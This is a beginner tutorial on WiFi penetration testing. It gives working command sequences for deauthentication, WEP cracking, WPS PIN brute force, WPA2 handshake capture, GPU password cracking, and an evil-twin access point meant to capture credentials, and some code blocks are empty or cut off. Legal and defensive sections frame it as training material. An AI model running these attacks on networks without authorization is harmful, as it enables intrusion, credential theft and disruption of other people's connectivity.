# WiFi Penetration Testing Basics: Getting Started with Wireless Security Testing

## Introduction

WiFi penetration testing is a critical skill for cybersecurity professionals. This guide provides a comprehensive introduction to wireless security testing, covering essential tools, techniques, and methodologies while emphasizing ethical and legal considerations.

**⚠️ IMPORTANT LEGAL NOTICE**
Only perform these techniques on networks you own or have explicit written permission to test. Unauthorized wireless penetration testing is illegal and can result in severe penalties.

## Prerequisites

### Hardware Requirements

#### Essential WiFi Adapter

```bash
# Recommended adapters with monitor mode support
- Alfa AWUS036ACS (802.11ac, recommended)
- Alfa AWUS036NHA (802.11n)
- Panda PAU09 (budget option)
- USB WiFi adapters with RT3070/RT5370 chipsets
```

#### Additional Hardware

```bash
# Optional but useful
- External antenna (increases range)
- USB extension cable (improves positioning)
- Portable power bank (for mobile testing)
- Directional antenna (for targeted testing)
```

### Software Environment

#### Kali Linux Setup

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install essential tools
sudo apt install -y \
  aircrack-ng \
  wifite \
  hashcat \
  john \
  hcxtools \
  hcxdumptool \
  wireshark \
  kismet \
  reaver
```

#### Verify WiFi Adapter

```bash
# Check if adapter is recognized
lsusb | grep -i wireless
iwconfig

# Check for monitor mode capability
iw list | grep -A 8 "Supported interface modes"
```

## WiFi Penetration Testing Methodology

### Phase 1: Reconnaissance

#### 1.1 Network Discovery

```bash
# Basic network scan
sudo iwlist wlan0 scan | grep -E "(ESSID|Address|Frequency|Quality|Encryption)"

# Using airodump-ng for detailed scan
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon

# Save results to file
sudo airodump-ng -w initial_scan wlan0mon
```

#### 1.2 Target Selection

```bash
# Identify interesting targets
- Open networks (no encryption)
- WEP networks (easily crackable)
- WPS-enabled networks
- Networks with weak signal (isolated testing)
```

#### 1.3 Client Detection

```bash
# Monitor specific network for clients
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w target_network wlan0mon

# Look for active clients (stations)
- Note client MAC addresses
- Monitor traffic patterns
- Identify device types (phone, laptop, etc.)
```

### Phase 2: Vulnerability Assessment

#### 2.1 WEP Network Testing

```bash
# Capture WEP traffic
sudo airodump-ng -c 6 --bssid [TARGET_MAC] -w wep_capture wlan0mon

# Generate traffic if needed
sudo aireplay-ng -1 0 -a [AP_MAC] wlan0mon  # Fake authentication
sudo aireplay-ng -3 -b [AP_MAC] wlan0mon     # ARP replay attack

# Crack WEP key
sudo aircrack-ng wep_capture-01.cap
```

#### 2.2 WPS Testing

```bash
# Scan for WPS-enabled networks
wash -i wlan0mon

# Test WPS PIN vulnerability
sudo reaver -i wlan0mon -b [TARGET_MAC] -vv

# Faster WPS testing with bully
sudo bully -b [TARGET_MAC] -c 6 wlan0mon
```

#### 2.3 WPA/WPA2 Testing (Preparation)

```bash
# Capture handshake
sudo airodump-ng -c 6 --bssid [TARGET_MAC] -w handshake wlan0mon

# Trigger deauthentication (in separate terminal)
sudo aireplay-ng -0 5 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon

# Verify handshake capture
aircrack-ng handshake-01.cap
```

### Phase 3: Exploitation Techniques

#### 3.1 Dictionary Attacks

```bash
# Basic dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Create custom wordlist
crunch 8 12 -t password%%% | head -1000 > custom.txt

# Use John the Ripper for wordlist generation
john --wordlist=/usr/share/wordlists/rockyou.txt --rules --stdout | aircrack-ng -w - handshake-01.cap
```

#### 3.2 Hashcat GPU Acceleration

```bash
# Convert capture to hashcat format
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# GPU-accelerated cracking
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Advanced hashcat rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

#### 3.3 Evil Twin Attacks (Basic)

```bash
# Create fake access point
sudo hostapd hostapd.conf &

# Example hostapd.conf
interface=wlan1
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# Capture credentials with captive portal
# (Advanced topic - see dedicated guide)
```

## Essential Tools Deep Dive

### Aircrack-ng Suite

#### airmon-ng

```bash
# Start monitor mode
sudo airmon-ng start wlan0

# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Check for interfering processes
sudo airmon-ng check kill
```

#### airodump-ng

```bash
# Basic usage
sudo airodump-ng wlan0mon

# Target specific channel

# Capture specific network
sudo airodump-ng -c 6 --bssid [MAC] -w capture wlan0mon

# Show only WEP networks
sudo airodump-ng --encrypt WEP wlan0mon
```

#### aireplay-ng

```bash
# Deauthentication attack
sudo aireplay-ng -0 10 -a [AP_MAC] wlan0mon

# Targeted deauth
sudo aireplay-ng -0 5 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon

# Fake authentication
sudo aireplay-ng -1 0 -a [AP_MAC] wlan0mon

# ARP replay attack (WEP)

```

## Common Attack Scenarios

### Scenario 1: Open Network Assessment

```bash
# Target: Open WiFi network
1. Connect to network
2. Perform network reconnaissance
3. Identify services and hosts
4. Test for captive portal bypass
5. Assess internal network security
```

### Scenario 2: WEP Network Cracking

```bash
# Step-by-step process
1. sudo airmon-ng start wlan0
2. sudo airodump-ng -c [CHANNEL] --bssid [AP_MAC] -w wep_test wlan0mon
3. sudo aireplay-ng -1 0 -a [AP_MAC] wlan0mon
4. sudo aireplay-ng -3 -b [AP_MAC] wlan0mon
5. aircrack-ng wep_test-01.cap
```

### Scenario 3: WPA2 Handshake Capture

```bash
# Complete workflow
1. sudo airodump-ng -c [CHANNEL] --bssid [AP_MAC] -w handshake wlan0mon
2. Wait for client connection or force deauth
3. sudo aireplay-ng -0 5 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon
4. Verify handshake in airodump-ng output
5. aircrack-ng -w wordlist.txt handshake-01.cap
```

## Defensive Considerations

### Network Hardening

```bash
# Recommendations for tested networks
1. Disable WPS if not needed
2. Use WPA3 or strong WPA2
3. Implement MAC address filtering (awareness of limitations)
4. Use strong, unique passphrases
5. Enable client isolation
6. Regular security assessments
```

### Detection and Monitoring

```bash
# Signs of WiFi attacks
- Unexpected deauthentication events
- Unknown devices in network logs
- Unusual traffic patterns
- Rogue access points detected
```

## Legal and Ethical Guidelines

### Before Testing

```bash
# Required documentation
1. Written authorization letter
2. Scope of engagement defined
3. Emergency contact information
4. Non-disclosure agreements signed
5. Insurance verification
```

### During Testing

```bash
# Best practices
1. Minimize service disruption
2. Document all activities
3. Avoid accessing sensitive data
4. Report critical findings immediately
5. Maintain professional conduct
```

### After Testing

```bash
# Reporting requirements
1. Detailed technical findings
2. Risk assessments
3. Remediation recommendations
4. Executive summary
5. Secure data destruction
```

## Troubleshooting Common Issues

### Monitor Mode Problems

```bash
# Fix common issues
sudo airmon-ng check kill
sudo systemctl stop NetworkManager
sudo ifconfig wlan0 down
sudo airmon-ng start wlan0
```

### Driver Issues

```bash
# Install proper drivers
sudo apt install realtek-rtl88xxau-dkms
sudo apt install dkms

# Compile custom drivers if needed
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
make && sudo make install
```

### No Handshake Capture

```bash
# Common solutions
